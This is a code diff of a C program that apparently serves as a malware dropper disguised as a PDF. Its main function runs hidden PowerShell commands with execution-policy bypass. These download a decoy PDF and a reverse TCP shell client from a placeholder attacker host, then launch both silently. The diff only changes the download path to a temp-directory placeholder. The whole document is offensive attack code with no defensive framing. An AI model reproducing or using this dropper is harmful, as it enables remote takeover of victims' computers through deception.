@@ -14,7 +14,7 @@ he is opening an pdf document when in reality he is executing an binary.exe with
 int main()
 {
  /* Here we use powershell to download/execute the Legit pdf doc And the reverse tcp Client shell */
- system("powershell -exec bypass -w 1 -C (NeW-Object Net.WebClient).DownloadFile('http://LhOsT/FiLNaMe.pdf', 'C:\\Users\\Public\\FiLNaMe.pdf') && powershell Start-Process -windowstyle hidden -FilePath 'C:\\Users\\Public\\FiLNaMe.pdf'");
- system("powershell -exec bypass -w 1 -C (NeW-Object Net.WebClient).DownloadFile('http://LhOsT/Client.exe', 'C:\\Users\\Public\\Client.exe') && powershell Start-Process -windowstyle hidden -FilePath 'C:\\Users\\Public\\Client.exe' -ArgumentList 'ip=LhOsT','port=LpOrT'");
+ system("powershell -exec bypass -w 1 -C (NeW-Object Net.WebClient).DownloadFile('http://LhOsT/FiLNaMe.pdf', 'TempDir\\FiLNaMe.pdf') && powershell Start-Process -windowstyle hidden -FilePath 'TempDir\\FiLNaMe.pdf'");
+ system("powershell -exec bypass -w 1 -C (NeW-Object Net.WebClient).DownloadFile('http://LhOsT/Client.exe', 'TempDir\\Client.exe') && powershell Start-Process -windowstyle hidden -FilePath 'TempDir\\Client.exe' -ArgumentList 'ip=LhOsT','port=LpOrT'");
  return 0;
 }
